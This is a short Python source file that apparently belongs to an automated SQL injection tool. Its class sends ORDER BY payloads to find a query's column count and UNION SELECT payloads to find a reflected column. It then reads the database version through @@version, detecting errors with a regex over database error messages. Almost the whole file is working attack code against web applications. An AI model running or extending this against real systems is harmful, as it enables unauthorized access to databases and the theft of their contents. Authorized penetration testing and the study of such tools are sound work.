import re


class SQLiExtractor:
    MAX_COLUMNS = 8

    SQL_ERROR_REGEX = re.compile(
        r"sql syntax|mysql_|mysqli_|ora-\d+|postgresql|odbc|sql server",
        re.I
    )

    VERSION_REGEX = re.compile(r"\d+\.\d+(\.\d+)?")

    def __init__(self, requester):
        self.requester = requester

    def detect_column_count(self, point):
        for col in range(1, self.MAX_COLUMNS + 1):
            r = self.requester.send(point.inject(f" ORDER BY {col}-- "))
            if not r:
                return None
            if self.SQL_ERROR_REGEX.search(r.text):
                return col - 1
        return None

    def detect_injectable_column(self, point, col_count):
        if not col_count:
            return None

        for idx in range(1, col_count + 1):
            cols = ["NULL"] * col_count
            cols[idx - 1] = "'INJECT_MARKER'"
            r = self.requester.send(point.inject(
                f" UNION SELECT {','.join(cols)}-- "
            ))
            if r and "INJECT_MARKER" in r.text:
                return idx
        return None

    def extract_db_version(self, point, col_count, inj_col):
        cols = ["NULL"] * col_count
        cols[inj_col - 1] = "@@version"
        r = self.requester.send(point.inject(
            f" UNION SELECT {','.join(cols)}-- "
        ))
        if not r:
            return None
        m = self.VERSION_REGEX.search(r.text)
        return m.group(0) if m else None